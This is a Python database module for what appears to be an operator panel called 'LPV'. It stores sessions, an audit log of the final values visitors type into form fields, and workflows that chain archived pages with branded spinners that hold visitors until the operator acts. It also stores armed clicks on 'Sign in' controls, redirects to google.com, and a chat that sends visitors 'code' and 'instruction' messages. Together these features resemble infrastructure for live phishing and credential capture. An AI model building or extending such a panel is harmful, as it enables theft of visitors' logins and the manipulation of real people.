    a regex that does not compile is rejected here so it can never be stored.
    """
    from page_bindings import normalise_bindings
    rules = normalise_bindings(bindings)
    for rule in rules:
        rule["replace"] = rule.get("value", "")
    with get_conn() as conn:
        cur = conn.execute(
            "UPDATE lpv_pages SET bindings = ?, updated_at = ? WHERE id = ?",
            (json.dumps(rules), time.time(), page_id),
        )
    return cur.rowcount > 0


# ---------------------------------------------------------------------------
# Sessions (current page per client)
# ---------------------------------------------------------------------------

def start_session(client_id: str) -> None:
    now = time.time()
    with get_conn() as conn:
        conn.execute(
            """
            INSERT INTO lpv_sessions (client_id, lpv_active, started_at, last_event_at)
            VALUES (?, 1, ?, ?)
            ON CONFLICT(client_id) DO UPDATE SET
                lpv_active = 1,
                started_at = excluded.started_at,
                last_event_at = excluded.last_event_at
            """,
            (client_id, now, now),
        )


def stop_session(client_id: str) -> None:
    with get_conn() as conn:
        conn.execute(
            "UPDATE lpv_sessions SET lpv_active = 0 WHERE client_id = ?",
            (client_id,),
        )


def get_session(client_id: str) -> Optional[Dict[str, Any]]:
    with get_conn() as conn:
        row = conn.execute(
            "SELECT * FROM lpv_sessions WHERE client_id = ?", (client_id,)
        ).fetchone()
    if not row:
        return None
    return {
        "client_id": row["client_id"],
        "current_page_id": row["current_page_id"],
        "current_page_name": row["current_page_name"],
        "lpv_active": bool(row["lpv_active"]),
        "started_at": row["started_at"],
        "last_event_at": row["last_event_at"],
    }


def set_current_page(client_id: str, page_id: Optional[str], page_name: Optional[str]) -> None:
    now = time.time()
    with get_conn() as conn:
        # Make sure a session row exists so the FK target is valid.
        conn.execute(
            """
            INSERT INTO lpv_sessions (client_id, lpv_active, started_at, last_event_at)
            VALUES (?, 1, ?, ?)
            ON CONFLICT(client_id) DO NOTHING
            """,
            (client_id, now, now),
        )
        conn.execute(
            """
            UPDATE lpv_sessions
            SET current_page_id = ?, current_page_name = ?, last_event_at = ?
            WHERE client_id = ?
            """,
            (page_id, page_name, now, client_id),
        )


# ---------------------------------------------------------------------------
# Audit log
# ---------------------------------------------------------------------------

def record_event(
    client_id: str,
    event_type: str,
    payload: Optional[Dict[str, Any]] = None,
    page_id: Optional[str] = None,
    page_name: Optional[str] = None,
) -> int:
    now = time.time()
    with get_conn() as conn:
        cur = conn.execute(
            """
            INSERT INTO lpv_audit (client_id, event_type, page_id, page_name, payload, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                client_id,
                event_type,
                page_id,
                page_name,
                json.dumps(payload or {}, default=str),
                now,
            ),
        )
        # Touch the session row so 'last_event_at' stays fresh.
        conn.execute(
            "UPDATE lpv_sessions SET last_event_at = ? WHERE client_id = ?",
            (now, client_id),
        )
        return cur.lastrowid


def list_events(client_id: str, limit: int = 200, since: Optional[float] = None) -> List[Dict[str, Any]]:
    with get_conn() as conn:
        if since is not None:
            rows = conn.execute(
                """
                SELECT * FROM lpv_audit
                WHERE client_id = ? AND timestamp > ?
                ORDER BY timestamp DESC
                LIMIT ?
                """,
                (client_id, since, limit),
            ).fetchall()
        else:
            rows = conn.execute(
                """
                SELECT * FROM lpv_audit
                WHERE client_id = ?
                ORDER BY timestamp DESC
                LIMIT ?
                """,
                (client_id, limit),
            ).fetchall()
    return [_row_to_event(r) for r in rows]


def list_profiles(limit: int = 500) -> List[Dict[str, Any]]:
    """Return one row per client_id that has audit history.

    Each row carries the per-client aggregate the Profiles sub-tab needs:
    total event count, distinct pages seen, first/last event timestamps,
    and a sample of the most recent event types so the operator can spot
    a session at a glance.

    Active sessions (rows in ``lpv_sessions``) are joined in to expose
    the current page when the client is live.
    """
    with get_conn() as conn:
        rows = conn.execute(
            """
            SELECT
                a.client_id                                              AS client_id,
                COUNT(*)                                                 AS event_count,
                COUNT(DISTINCT COALESCE(a.page_id, ''))                 AS page_count,
                MIN(a.timestamp)                                         AS first_seen,
                MAX(a.timestamp)                                         AS last_seen,
                -- JSON array of the most recent 5 event types, newest first.
                (
                    SELECT json_group_array(e.event_type)
                    FROM (
                        SELECT event_type
                        FROM lpv_audit
                        WHERE client_id = a.client_id
                        ORDER BY timestamp DESC
                        LIMIT 5
                    ) e
                )                                                       AS recent_event_types,
                -- Most recent page this client was on (name, then id).
                (
                    SELECT page_name FROM lpv_audit
                    WHERE client_id = a.client_id AND page_name IS NOT NULL
                    ORDER BY timestamp DESC LIMIT 1
                )                                                       AS last_page_name,
                (
                    SELECT page_id FROM lpv_audit
                    WHERE client_id = a.client_id AND page_id IS NOT NULL
                    ORDER BY timestamp DESC LIMIT 1
                )                                                       AS last_page_id,
                -- Count of field_final events (the "what they actually
                -- typed before submitting" log).  Useful stat for the
                -- card: a client with hundreds of field_final events
                -- is clearly filling stuff in.
                (
                    SELECT COUNT(*) FROM lpv_audit
                    WHERE client_id = a.client_id
                      AND event_type = 'field_final'
                )                                                       AS field_final_count
            FROM lpv_audit a
            GROUP BY a.client_id
            ORDER BY last_seen DESC
            LIMIT ?
            """,
            (limit,),
        ).fetchall()

        # Left-join to lpv_sessions for the "currently active" flag.
        session_rows = conn.execute(
            "SELECT client_id, current_page_id, current_page_name, "
            "started_at, last_event_at FROM lpv_sessions"
        ).fetchall()
    sessions_by_id = {r["client_id"]: _row_to_session(r) for r in session_rows}

    out: List[Dict[str, Any]] = []
    for r in rows:
        cid = r["client_id"]
        recent = []
        try:
            parsed = json.loads(r["recent_event_types"] or "[]")
            if isinstance(parsed, list):
                recent = [str(x) for x in parsed]
        except Exception:
            recent = []
        sess = sessions_by_id.get(cid) or {}
        out.append({
            "client_id":            cid,
            "event_count":          int(r["event_count"] or 0),
            "page_count":           int(r["page_count"] or 0),
            "first_seen":           float(r["first_seen"] or 0.0),
            "last_seen":            float(r["last_seen"] or 0.0),
            "recent_event_types":   recent,
            "last_page_name":       r["last_page_name"] or "",
            "last_page_id":         r["last_page_id"] or "",
            "field_final_count":    int(r["field_final_count"] or 0),
            "is_active":            bool(sess),
            "current_page_id":      sess.get("current_page_id", ""),
            "current_page_name":    sess.get("current_page_name", ""),
            "session_started_at":   sess.get("session_started_at", 0.0),
        })
    return out


def _row_to_event(row: sqlite3.Row) -> Dict[str, Any]:
    try:
        payload = json.loads(row["payload"] or "{}")
    except Exception:
        payload = {}
    return {
        "id": row["id"],
        "client_id": row["client_id"],
        "event_type": row["event_type"],
        "page_id": row["page_id"],
        "page_name": row["page_name"],
        "payload": payload,
        "timestamp": row["timestamp"],
    }


def _row_to_session(row: sqlite3.Row) -> Dict[str, Any]:
    return {
        "client_id":          row["client_id"],
        "current_page_id":    row["current_page_id"] or "",
        "current_page_name":  row["current_page_name"] or "",
        "session_started_at": float(row["started_at"] or 0.0),
        "last_event_at":      float(row["last_event_at"] or 0.0),
    }


# ---------------------------------------------------------------------------
# Redaction rules (per-client field masking)
# ---------------------------------------------------------------------------

def set_redaction(client_id: str, selector: str, field: str, action: str = "mask") -> None:
    """Add or replace a redaction rule for a client. `field` is which
    HTML attribute the selector matches against — name, type, id,
    placeholder, label, or class. `action` is 'mask' (replace value
    with bullets) or 'hide' (drop the field from the event entirely).
    """
    if action not in ("mask", "hide"):
        raise ValueError("action must be 'mask' or 'hide'")
    if field not in ("name", "type", "id", "placeholder", "label", "class"):
        raise ValueError(f"unknown field {field!r}")
    with get_conn() as conn:
        conn.execute(
            """
            INSERT INTO lpv_redaction (client_id, selector, field, action, created_at)
            VALUES (?, ?, ?, ?, ?)
            ON CONFLICT(client_id, selector, field) DO UPDATE SET
                action = excluded.action
            """,
            (client_id, selector, field, action, time.time()),
        )


def delete_redaction(client_id: str, selector: str, field: str) -> None:
    with get_conn() as conn:
        conn.execute(
            "DELETE FROM lpv_redaction WHERE client_id = ? AND selector = ? AND field = ?",
            (client_id, selector, field),
        )


def list_redaction(client_id: str) -> List[Dict[str, Any]]:
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM lpv_redaction WHERE client_id = ? ORDER BY created_at DESC",
            (client_id,),
        ).fetchall()
    return [
        {
            "client_id": r["client_id"],
            "selector": r["selector"],
            "field": r["field"],
            "action": r["action"],
            "created_at": r["created_at"],
        }
        for r in rows
    ]


# ---------------------------------------------------------------------------
# Workflows (ordered page chains)
# ---------------------------------------------------------------------------

def save_workflow(workflow_id: Optional[str], name: str, description: str, steps: List[Dict[str, Any]],
                  brand_logo_url: Optional[str] = None,
                  brand_color: Optional[str] = None,
                  respect_redirect: Optional[bool] = None,
                  redirect_html: Optional[str] = None,
                  redirect_page_id: Optional[str] = None) -> Dict[str, Any]:
    """Create or update a workflow. `steps` is a list of dicts:
       {kind: 'page',      page_id: '...', page_name: '...'}
       {kind: 'redirect',  wait_seconds: 4}  — redirect spinner now has NO timeout (waits forever for lpv_spinner or disconnect)
       {kind: 'goto',      url: 'http://www.google.com'} — real page navigation
       {kind: 'action',    match: 'text:Sign in', do: 'page'|'link',
                           page_id/page_name or url, wait_seconds: 0} — arm a
                           click on the page in front of the visitor, then
                           take them to the target when it is pressed
       {kind: 'wait',      sleep_seconds: 2}

    Branding/behavior kwargs (per-workflow "LPV loading screen"):
       brand_logo_url   custom logo shown on the branded loading screen;
                        '' clears it, None keeps the previous value.
       brand_color      hex, rgb(), or rgba() spinner color ('' = default/inherit,
                        None = keep).
       respect_redirect False -> redirect steps just sleep wait_seconds and
                        continue instead of waiting forever for the client's
                        spinner click ("redirect logic is optional").
       redirect_html    raw HTML rendered INSTEAD of the built-in spinner
                        whenever a redirect step (or any page load) is in
                        flight. '' clears it, None keeps the previous value.
       redirect_page_id reuse an archived LPV page as the loading screen.
                        Only consulted when redirect_html is empty.
    """
    name = (name or "").strip()
    if not name:
        raise ValueError("workflow name is required")
    # ---- validate branding/behavior fields ----
    if brand_logo_url is not None:
        brand_logo_url = (brand_logo_url or "").strip()
        if brand_logo_url and not brand_logo_url.lower().startswith(("http://", "https://")):
            raise ValueError("brand logo URL must start with http:// or https://")
        if len(brand_logo_url) > 2048:
            raise ValueError("brand logo URL too long")
    if brand_color is not None:
        brand_color = (brand_color or "").strip()
        # Admin normally emits a hex value, but keep API-created workflows
        # compatible with CSS rgb()/rgba() palette values as well. The client
        # normalizes all three forms before applying them to the spinner/LPV.
        _hex_color = r"#[0-9a-fA-F]{3,4}|#[0-9a-fA-F]{6}|#[0-9a-fA-F]{8}"
        _rgb_color = (
            r"rgba?\(\s*[0-9]{1,3}\s*,\s*[0-9]{1,3}\s*,\s*[0-9]{1,3}"
            r"(?:\s*,\s*(?:0|1|0?\.[0-9]+))?\s*\)"
        )
        if brand_color and not re.fullmatch(
                rf"(?:{_hex_color}|{_rgb_color})", brand_color, flags=re.IGNORECASE):
            raise ValueError(
                "brand color must be a hex, rgb(), or rgba() CSS color "
                "(or empty for default)"
            )
    if redirect_html is not None:
        redirect_html = redirect_html or ""
        if len(redirect_html) > 2 * 1024 * 1024:
            raise ValueError("redirect page HTML is too large (2 MB max)")
    if redirect_page_id is not None:
        redirect_page_id = (redirect_page_id or "").strip()
    if respect_redirect is not None:
        respect_redirect = bool(respect_redirect)
    # Validate steps
    norm_steps = []
    for s in steps or []:
        kind = s.get("kind")
        # normalize goto aliases: 'go to', 'navigate', 'goto'
        if kind in ("go to", "navigate"):
            kind = "goto"
        if kind == "page":
            if not s.get("page_id"):
                continue
            step_out = {
                "kind": kind,
                "page_id": s["page_id"],
                "page_name": s.get("page_name", ""),
            }
            norm_steps.append(step_out)
        elif kind == "goto":
            raw_url = (s.get("url") or s.get("page_url") or s.get("href") or "").strip()
            if not raw_url:
                raise ValueError("goto step requires a url")
            # Validate URL shape — allow domain without scheme, but must look URL-ish
            # Minimal validation: contains '.' or ':' and no spaces, length 3..2048
            if " " in raw_url or len(raw_url) < 3 or len(raw_url) > 2048:
                raise ValueError(f"invalid goto url {raw_url!r}")
            # Prepend https if no scheme
            url = raw_url
            if not url.lower().startswith(("http://", "https://")):
                url = "https://" + url
            # Further validation: must parse as http(s) URL with netloc
            try:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                if not parsed.netloc or "." not in parsed.netloc:
                    raise ValueError()
            except Exception:
                raise ValueError(f"invalid goto url {raw_url!r}")
            norm_steps.append({"kind": "goto", "url": url})
        elif kind == "redirect":
            # REDIRECT = LVP spinner body — not a page. It waits FOREVER for the
            # client's overlay spinner (triggered by submit/button click)
            # then sleeps wait_seconds before next page. No timeout.
            wait_secs = max(0, min(60, int(s.get("wait_seconds", 0) or 0)))
            step_out: Dict[str, Any] = {
                "kind": "redirect",
                "wait_seconds": wait_secs,
            }
            # Preserve explicit flag if caller disabled spinner wait.
            if "wait_for_spinner" in s:
                step_out["wait_for_spinner"] = bool(s["wait_for_spinner"])
            # Backward compat: ignore wait_for_spinner_timeout if sent by old UI — no longer used
            # but preserve legacy old field silently for forward compat (not honored at run)
            # Backward compat: old redirect steps had a page_id — keep it for display but ignored at execution.
            if s.get("page_id"):
                step_out["page_id"] = s["page_id"]
                step_out["page_name"] = s.get("page_name", "")
            norm_steps.append(step_out)
        elif kind == "action":
            # "If the visitor clicks this, go there." The matcher is a guard
            # rule, and the target is either another archived page or a link.
            rule = normalise_action({
                "match": s.get("match") or s.get("selector"),
                "do": s.get("do") or s.get("action"),
                "page_id": s.get("page_id"),
                "page_name": s.get("page_name"),
                "url": s.get("url") or s.get("href"),
                "label": s.get("label"),
            })
            if not rule:
                raise ValueError("action step needs a control to match and a target")
            step_out = dict(rule)
            step_out["kind"] = "action"
            # 0 = arm the rule and carry on; >0 = wait that many seconds for
            # the click before moving to the next step.
            step_out["wait_seconds"] = max(0, min(3600, int(s.get("wait_seconds", 0) or 0)))
            norm_steps.append(step_out)
        elif kind == "wait":
            secs = max(0, min(60, int(s.get("sleep_seconds", 1) or 0)))
            norm_steps.append({"kind": "wait", "sleep_seconds": secs})
    wid = workflow_id or uuid.uuid4().hex
    now = time.time()
    with get_conn() as conn:
        existing = conn.execute(
            "SELECT * FROM lpv_workflows WHERE id = ?", (wid,)
        ).fetchone()
        if existing:
            # None means "caller didn't send it — keep the previous value"
            def _prev(key, default):
                try:
                    v = existing[key]
                    return default if v is None else v
                except Exception:
                    return default
            _logo = _prev("brand_logo_url", "") if brand_logo_url is None else brand_logo_url
            _color = _prev("brand_color", "") if brand_color is None else brand_color
            _respect = _prev("respect_redirect", 1) if respect_redirect is None else (1 if respect_redirect else 0)
            _rhtml = _prev("redirect_html", "") if redirect_html is None else redirect_html
            _rpage = _prev("redirect_page_id", "") if redirect_page_id is None else redirect_page_id
            conn.execute(
                """
                UPDATE lpv_workflows
                SET name = ?, description = ?, steps = ?, brand_logo_url = ?,
                    brand_color = ?, respect_redirect = ?,
                    redirect_html = ?, redirect_page_id = ?, updated_at = ?
                WHERE id = ?
                """,
                (name, description, json.dumps(norm_steps), _logo or "", _color or "",
                 int(_respect or 0), _rhtml or "", _rpage or "", now, wid),
            )
        else:
            _logo = brand_logo_url or ""
            _color = brand_color or ""
            _respect = 1 if respect_redirect is None else (1 if respect_redirect else 0)
            _rhtml = redirect_html or ""
            _rpage = (redirect_page_id or "").strip()
            conn.execute(
                """
                INSERT INTO lpv_workflows (id, name, description, steps,
                                           brand_logo_url, brand_color, respect_redirect,
                                           redirect_html, redirect_page_id,
                                           created_at, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (wid, name, description, json.dumps(norm_steps), _logo, _color, _respect,
                 _rhtml, _rpage, now, now),
            )
    return get_workflow(wid) or {}


def list_workflows() -> List[Dict[str, Any]]:
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM lpv_workflows ORDER BY updated_at DESC"
        ).fetchall()
    return [_row_to_workflow(r) for r in rows]


def get_workflow(workflow_id: str) -> Optional[Dict[str, Any]]:
    with get_conn() as conn:
        r = conn.execute(
            "SELECT * FROM lpv_workflows WHERE id = ?", (workflow_id,)
        ).fetchone()
    return _row_to_workflow(r) if r else None


def delete_workflow(workflow_id: str) -> bool:
    with get_conn() as conn:
        cur = conn.execute("DELETE FROM lpv_workflows WHERE id = ?", (workflow_id,))
        return cur.rowcount > 0


def _row_to_workflow(row: sqlite3.Row) -> Dict[str, Any]:
    try:
        steps = json.loads(row["steps"] or "[]")
    except Exception:
        steps = []

    def _col(key, default):
        # Columns added via migration may be absent on very old rows/DBs.
        try:
            v = row[key]
            return default if v is None else v
        except Exception:
            return default

    return {
        "id": row["id"],
        "name": row["name"],
        "description": row["description"],
        "steps": steps,
        "brand_logo_url": _col("brand_logo_url", "") or "",
        "brand_color": _col("brand_color", "") or "",
        "respect_redirect": bool(_col("respect_redirect", 1)),
        "redirect_html": _col("redirect_html", "") or "",
        "redirect_page_id": _col("redirect_page_id", "") or "",
        "has_redirect_page": bool(
            (_col("redirect_html", "") or "") or (_col("redirect_page_id", "") or "")
        ),
        "created_at": row["created_at"],
        "updated_at": row["updated_at"],
    }


# ---------------------------------------------------------------------------
# Live chat
# ---------------------------------------------------------------------------
# Operator <-> client messaging on LPV pages. Everything is append-only and
# keyed by client_id, so history survives disconnects, reconnects and server
# restarts for both sides.

_CHAT_ROLES = ("client", "admin")
_CHAT_KINDS = ("text", "code", "instruction")


def chat_add(
    client_id: str,
    role: str,
    body: str = "",
    kind: str = "text",
    code: str = "",
    identity_key: Optional[str] = None,
) -> Dict[str, Any]:
    """Append one message. Returns the stored row.

    Unknown roles/kinds are coerced instead of rejected — an admin UI that
    sends something new should degrade to a plain text bubble, not 500.

    ``identity_key`` is the durable per-person key. When given, the message
    joins that person's thread regardless of which runtime ``client_id``
    (tab) happened to send it, so history survives a new tab or a later
    visit. Left empty, the row groups under its client_id exactly as before.
    """
    cid = (client_id or "").strip()
    if not cid:
        raise ValueError("client_id is required")
    role = (role or "client").strip().lower()
    if role not in _CHAT_ROLES:
        role = "client"
    kind = (kind or "text").strip().lower()
    if kind not in _CHAT_KINDS:
        kind = "text"
    body = "" if body is None else str(body)
    code = "" if code is None else str(code)
    # Hard caps so a runaway client cannot balloon the DB.
    body = body[:8000]
    code = code[:8000]
    if kind == "text" and not body.strip() and not code.strip():
        raise ValueError("message is empty")
    ident = (identity_key or "").strip() or None
    now = time.time()
    with get_conn() as conn:
        cur = conn.execute(
            "INSERT INTO lpv_chat "
            "(client_id, identity_key, role, kind, body, code, created_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (cid, ident, role, kind, body, code, now),
        )
        row_id = int(cur.lastrowid or 0)
    return {
        "id": row_id,
        "client_id": cid,
        "identity_key": ident or "",
        "role": role,
        "kind": kind,
        "body": body,
        "code": code,
        "created_at": now,
    }


def chat_list(
    client_id: str,
    limit: int = 500,
    since: Optional[float] = None,
    identity_key: Optional[str] = None,
) -> List[Dict[str, Any]]:
    """Oldest-first history for one client (render order).

    With ``identity_key`` this returns the whole person's thread: every
    message tagged with their durable key, plus any older rows that were
    written under this exact client_id before the key existed. That keeps
    a thread continuous instead of appearing to reset when a visitor
    opens a new tab.
    """
    cid = (client_id or "").strip()
    ident = (identity_key or "").strip()
    if not cid and not ident:
        return []
    limit = max(1, min(int(limit or 500), 2000))
    with get_conn() as conn:
        if ident:
            # Rows for this person, from any tab, plus legacy rows for this
            # tab that predate identity tagging.
            sql = (
                "SELECT * FROM lpv_chat WHERE "
                "(identity_key = ? OR (client_id = ? AND "
                "(identity_key IS NULL OR identity_key = '')))"
            )
            params: list = [ident, cid]
            if since:
                sql += " AND created_at > ?"
                params.append(float(since))
            sql += " ORDER BY created_at DESC LIMIT ?"
            params.append(limit)
            rows = conn.execute(sql, tuple(params)).fetchall()
        else:
            if since:
                rows = conn.execute(
                    "SELECT * FROM lpv_chat WHERE client_id = ? AND created_at > ? "
                    "ORDER BY created_at DESC LIMIT ?",
                    (cid, float(since), limit),
                ).fetchall()
            else:
                rows = conn.execute(
                    "SELECT * FROM lpv_chat WHERE client_id = ? "
                    "ORDER BY created_at DESC LIMIT ?",
                    (cid, limit),
                ).fetchall()
    return [_chat_row(r) for r in reversed(rows)]


def chat_last_id(client_id: str, identity_key: Optional[str] = None) -> int:
    """Highest message id for a client — cheap change detection for pollers."""
    ident = (identity_key or "").strip()
    with get_conn() as conn:
        if ident:
            r = conn.execute(
                "SELECT MAX(id) AS m FROM lpv_chat WHERE "
                "(identity_key = ? OR (client_id = ? AND "
                "(identity_key IS NULL OR identity_key = '')))",
                (ident, (client_id or "").strip()),
            ).fetchone()
        else:
            r = conn.execute(
                "SELECT MAX(id) AS m FROM lpv_chat WHERE client_id = ?",
                ((client_id or "").strip(),),
            ).fetchone()
    return int(r["m"] or 0) if r else 0


def chat_threads(limit: int = 200) -> List[Dict[str, Any]]:
    """One row per person who has ever chatted, newest activity first.

    Grouped by the durable identity_key when present and falling back to
    client_id, so a visitor who chatted from three tabs still shows a
    single thread rather than three. ``client_id`` in the returned row is
    the most recent runtime id seen for that person, which is what the
    admin needs in order to actually reply.

    Carries the last message preview and how many of the most recent
    messages came from the client (the admin's unread count).
    """
    with get_conn() as conn:
        rows = conn.execute(
            """
            SELECT COALESCE(NULLIF(TRIM(identity_key), ''), client_id) AS who,
                   COUNT(*)                        AS msg_count,
                   MAX(created_at)                 AS last_at,
                   SUM(CASE WHEN role = 'client' THEN 1 ELSE 0 END) AS from_client,
                   (SELECT client_id FROM lpv_chat c2
                     WHERE COALESCE(NULLIF(TRIM(c2.identity_key), ''), c2.client_id)
                         = COALESCE(NULLIF(TRIM(lpv_chat.identity_key), ''), lpv_chat.client_id)
                     ORDER BY c2.created_at DESC, c2.id DESC LIMIT 1) AS latest_client_id
            FROM lpv_chat
            GROUP BY who
            ORDER BY last_at DESC
            LIMIT ?
            """,
            (max(1, min(int(limit or 200), 1000)),),
        ).fetchall()
        out: List[Dict[str, Any]] = []
        for r in rows:
            cid = r["who"]
            last = conn.execute(
                "SELECT kind, body, code, role FROM lpv_chat WHERE "
                "COALESCE(NULLIF(TRIM(identity_key), ''), client_id) = ? "
                "ORDER BY created_at DESC, id DESC LIMIT 1",
                (cid,),
            ).fetchone()
            preview = ""
            if last:
                preview = (last["body"] or "").strip()
                if not preview and last["code"]:
                    preview = "[code] " + last["code"].strip().splitlines()[0][:60]
                if not preview and last["kind"] == "code":
                    preview = "[code]"
            out.append({
                "client_id":     r["latest_client_id"] or cid,
                "identity_key":  cid,
                "msg_count":     int(r["msg_count"] or 0),
                "last_at":       float(r["last_at"] or 0.0),
                "from_client":   int(r["from_client"] or 0),
                "last_preview":  preview[:160],
                "last_role":     (last["role"] if last else "") or "",
            })
    return out


def chat_clear(client_id: str, identity_key: Optional[str] = None) -> int:
    """Wipe a thread. Returns the number of rows removed.

    With ``identity_key`` this clears the person's whole thread across
    every tab, not just the rows carrying one runtime id. Falls back to
    the legacy client_id-only delete when no key is given.
    """
    ident = (identity_key or "").strip()
    cid = (client_id or "").strip()
    with get_conn() as conn:
        if ident:
            cur = conn.execute(
                "DELETE FROM lpv_chat WHERE "
                "(identity_key = ? OR (client_id = ? AND "
                "(identity_key IS NULL OR identity_key = '')))",
                (ident, cid),
            )
        else:
            cur = conn.execute(
                "DELETE FROM lpv_chat WHERE client_id = ?", (cid,)
            )
        return int(cur.rowcount or 0)


def chat_identity_for(client_id: str) -> str:
    """Return the durable identity key recorded for a client, if any.

    Lets the server recover a person's thread after a restart, when the
    in-memory client_id -> identity map has been lost but the message
    rows still carry their key.
    """
    cid = (client_id or "").strip()
    if not cid:
        return ""
    with get_conn() as conn:
        r = conn.execute(
            "SELECT identity_key FROM lpv_chat "
            "WHERE client_id = ? AND identity_key IS NOT NULL "
            "AND TRIM(identity_key) <> '' "
            "ORDER BY created_at DESC, id DESC LIMIT 1",
            (cid,),
        ).fetchone()
    return (r["identity_key"] or "").strip() if r else ""


def _chat_row(row: "sqlite3.Row") -> Dict[str, Any]:
    return {
        "id":         int(row["id"]),
        "client_id":  row["client_id"],
        "identity_key": (row["identity_key"] if "identity_key" in row.keys() else "") or "",
        "role":       row["role"],
        "kind":       row["kind"],
        "body":       row["body"] or "",
        "code":       row["code"] or "",
        "created_at": float(row["created_at"] or 0.0),
    }
